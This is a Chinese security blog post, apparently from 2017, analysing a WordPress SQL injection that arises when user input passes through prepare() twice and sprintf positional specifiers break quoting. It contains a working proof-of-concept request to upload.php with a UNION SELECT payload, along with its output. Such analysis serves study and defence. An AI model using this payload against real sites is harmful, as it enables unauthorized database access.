@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>重复 prepare 带来的 WordPress 注入漏洞分析 - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="重复 prepare 带来的 WordPress 注入漏洞分析 - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/774/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            
+        </div>
+        <h1>重复 prepare 带来的 WordPress 注入漏洞分析</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2017-08-30 03:09"><i class="iconfont icon-date"></i>2017-08-30 03:09</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p>原文比较乱，重新整理和总结了一下</p>
+
+<p>https://medium.com/websec/wordpress-sqli-bbb2afcc8e94<br />
+ https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e</p>
+
+<h2 id="sprintf-函数">sprintf 函数</h2>
+
+<p>两个例子</p>
+
+<ul>
+  <li>可以使用 <code class="highlighter-rouge">%n$</code> 取到第 n 个参数</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code>echo sprintf('The %2$s contains %1$d monkeys', 100, "zoo");
+</code></pre>
+</div>
+
+<p>输出 <code class="highlighter-rouge">The zoo contains 100 monkeys</code></p>
+
+<ul>
+  <li><code class="highlighter-rouge">%n$</code> 后面可以加入 padding 的指示符，使用 <code class="highlighter-rouge">'</code>开头</li>
+</ul>
+
+<blockquote>
+  <p>An optional padding specifier that says what character will be used for padding the results to the right string size. This may be a space character or a 0 (zero character). The default is to pad with spaces. An alternate padding character can be specified by prefixing it with a single quote (‘).</p>
+</blockquote>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code>echo sprintf('The %2$s contains %1$\'#10d monkeys', 100, "zoo");
+</code></pre>
+</div>
+<p>输出 <code class="highlighter-rouge">The zoo contains #######100 monkeys</code></p>
+
+<h2 id="prepare-函数">prepare 函数</h2>
+
+<p><a href="https://github.com/WordPress/WordPress/blob/820d3973a33d60ce710bfd5b2f5a0b40c37ca785/wp-includes/wp-db.php#L1228">原始代码</a></p>
+
+<p>下面是一个精简版的</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code>class wpdb {
+  function _real_escape( $string ) {
+    return addslashes( $string );
+  }
+
+  public function escape_by_ref( <span class="err">&amp;</span>$string ) {
+    if ( ! is_float( $string ) )
+      $string = $this-&gt;_real_escape( $string );
+  }
+
+  public function prepare( $query, $args ) {
+    $args = func_get_args();
+    array_shift( $args );
+    // If args were passed as an array (as in vsprintf), move them up
+    if ( isset( $args[0] ) <span class="err">&amp;&amp;</span> is_array($args[0]) ) {
+      $args = $args[0];
+    }
+    // in case someone mistakenly already singlequoted it
+    $query = str_replace( "'%s'", '%s', $query ); 
+    // doublequote unquoting
+    $query = str_replace( '"%s"', '%s', $query ); 
+    // quote the strings, avoiding escaped strings like %%s
+    $query = preg_replace( '|(?<span class="err">&lt;</span>!%)%s|', "'%s'", $query );
+    array_walk( $args, array( $this, 'escape_by_ref' ) );
+    var_dump("query: ".$query);
+    return @vsprintf( $query, $args );
+  }
+}
+</code></pre>
+</div>
+
+<p>prepare 函数的作用</p>
+
+<ul>
+  <li>整理函数参数，<code class="highlighter-rouge">$args</code> 为 array</li>
+  <li>将 <code class="highlighter-rouge">$args</code> 中的 <code class="highlighter-rouge">'%s'</code> 和 <code class="highlighter-rouge">"%s"</code> 的单双引号去掉</li>
+  <li>将 <code class="highlighter-rouge">$args</code> 中的 <code class="highlighter-rouge">%s</code> 变为 <code class="highlighter-rouge">'%s'</code></li>
+  <li><code class="highlighter-rouge">addslashes</code> <code class="highlighter-rouge">$args</code> 中的参数</li>
+</ul>
+
+<h2 id="函数调用栈">函数调用栈</h2>
+
+<p>在 <a href="https://github.com/WordPress/WordPress/blob/master/wp-admin/upload.php#L163">upload.php</a> 调用了 <a href="https://github.com/WordPress/WordPress/blob/9891448a421f495e3745356bab88ec985a0e64b8/wp-includes/post.php#L4864">wp_delete_attachment( $post_id_del )</a></p>
+
+<p><code class="highlighter-rouge">wp_delete_attachment</code> 中，<code class="highlighter-rouge">$post_id</code> 是用户可以完全控制的参数，来自 <code class="highlighter-rouge">$post_ids = $_REQUEST['media']</code>，然后循环执行下面的逻辑</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code>if ( !$post = $wpdb-&gt;get_row( $wpdb-&gt;prepare("SELECT * FROM $wpdb-&gt;posts WHERE ID = %d", $post_id) ) )
+    return $post;
+</code></pre>
+</div>
+
+<p>这里有第一个检查，但是因为是 <code class="highlighter-rouge">%d</code>，虽然 <code class="highlighter-rouge">$post_id</code> 不是数字，但是如果是数字开头还是可以被转换为了数字的，可以绕过。</p>
+
+<p>然后调用了 <a href="https://github.com/WordPress/WordPress/blob/3ecfb4b222e55b8e064c1b56b7b7030bc4fc940d/wp-includes/meta.php#L307">delete_metadata( ‘post’, null, ‘_thumbnail_id’, $post_id, true )</a></p>
+
+<p>有第二个检查，无法绕过，必须要插入数据，否则就 <code class="highlighter-rouge">return false</code>了。而且 <code class="highlighter-rouge">meta_value</code> 是 payload，这也是原文中要使用  XML-RPC 的原因</p>
+
+<p>这里 <code class="highlighter-rouge">$meta_value</code> 就是上面的 <code class="highlighter-rouge">$post_id</code></p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code>$query = $wpdb-&gt;prepare( "SELECT $id_column FROM $table WHERE meta_key = %s", $meta_key );
+if ( !$delete_all )
+  $query .= $wpdb-&gt;prepare(" AND $type_column = %d", $object_id );
+if ( '' !== $meta_value <span class="err">&amp;&amp;</span> null !== $meta_value <span class="err">&amp;&amp;</span> false !== $meta_value )
+  $query .= $wpdb-&gt;prepare(" AND meta_value = %s", $meta_value );
+$meta_ids = $wpdb-&gt;get_col( $query );
+if ( !count( $meta_ids ) )
+  return false;
+</code></pre>
+</div>
+
+<p>接下来的流程直接带入 POC 了</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code>$obj= new wpdb;
+// 用户可以完全控制的参数
+$meta_value = "%1$%s and PAYLOAD";
+$value_clause = $obj-&gt;prepare(" and meta_value = %s", $meta_value);
+$sql = "select * from table where meta_key=%s $value_clause";
+var_dump($sql);
+// value_clause 被 prepare 了两遍
+var_dump($obj-&gt;prepare($sql, "***"));
+</code></pre>
+</div>
+
+<p>的结果是</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code>// 将 %s 放入单引号内，准备 sprintf
+string(29) "query:  and meta_value = '%s'"
+// %s 被替换为 %1$%s and PAYLOAD
+string(75) "select * from table where meta_key=%s  and meta_value = '%1$%s and PAYLOAD'"
+// 再次 prepare，%s 被放入单引号内
+string(86) "query: select * from table where meta_key='%s'  and meta_value = '%1$'%s' and PAYLOAD'"
+// 第一个 %s 变成 ***，%1$ 变为 ***，'%s 不需要 padding 就消失了
+string(77) "select * from table where meta_key='***'  and meta_value = '***' and PAYLOAD'"
+</code></pre>
+</div>
+
+<p>还可以这样测试下</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code>var_dump(sprintf('select * from table where meta_key=\'%s\'  and meta_value = \'5 %1$\'%10s\' and PAYLOAD\'', "***"));
+</code></pre>
+</div>
+
+<p>的输出是</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code>string(86) "select * from table where meta_key='***'  and meta_value = '5 %%%%%%%***' and PAYLOAD'"
+</code></pre>
+</div>
+
+<p>POC 是 <code class="highlighter-rouge">/wp-admin/upload.php?_wpnonce=e3280c0238&amp;action=delete&amp;media[]=28 %1$%s union select version() # </code></p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code>string(128) "SELECT post_id FROM wp_postmeta WHERE meta_key = '_thumbnail_id'  AND meta_value = '28 _thumbnail_id' union select version() # '"
+array(1) {
+  [0]=&gt;
+  string(6) "5.7.19"
+}
+</code></pre>
+</div>
+
+<h2 id="总结">总结</h2>
+
+<ul>
+  <li>这个漏洞很难利用，但是其他位置或者插件可能也有类似的问题，比如 https://blog.sucuri.net/2017/02/sql-injection-vulnerability-nextgen-gallery-wordpress.html</li>
+  <li>其他框架也可能有类似的问题</li>
+</ul>
+
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=重复 prepare 带来的 WordPress 注入漏洞分析&article_id=/index.php/archives/774/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
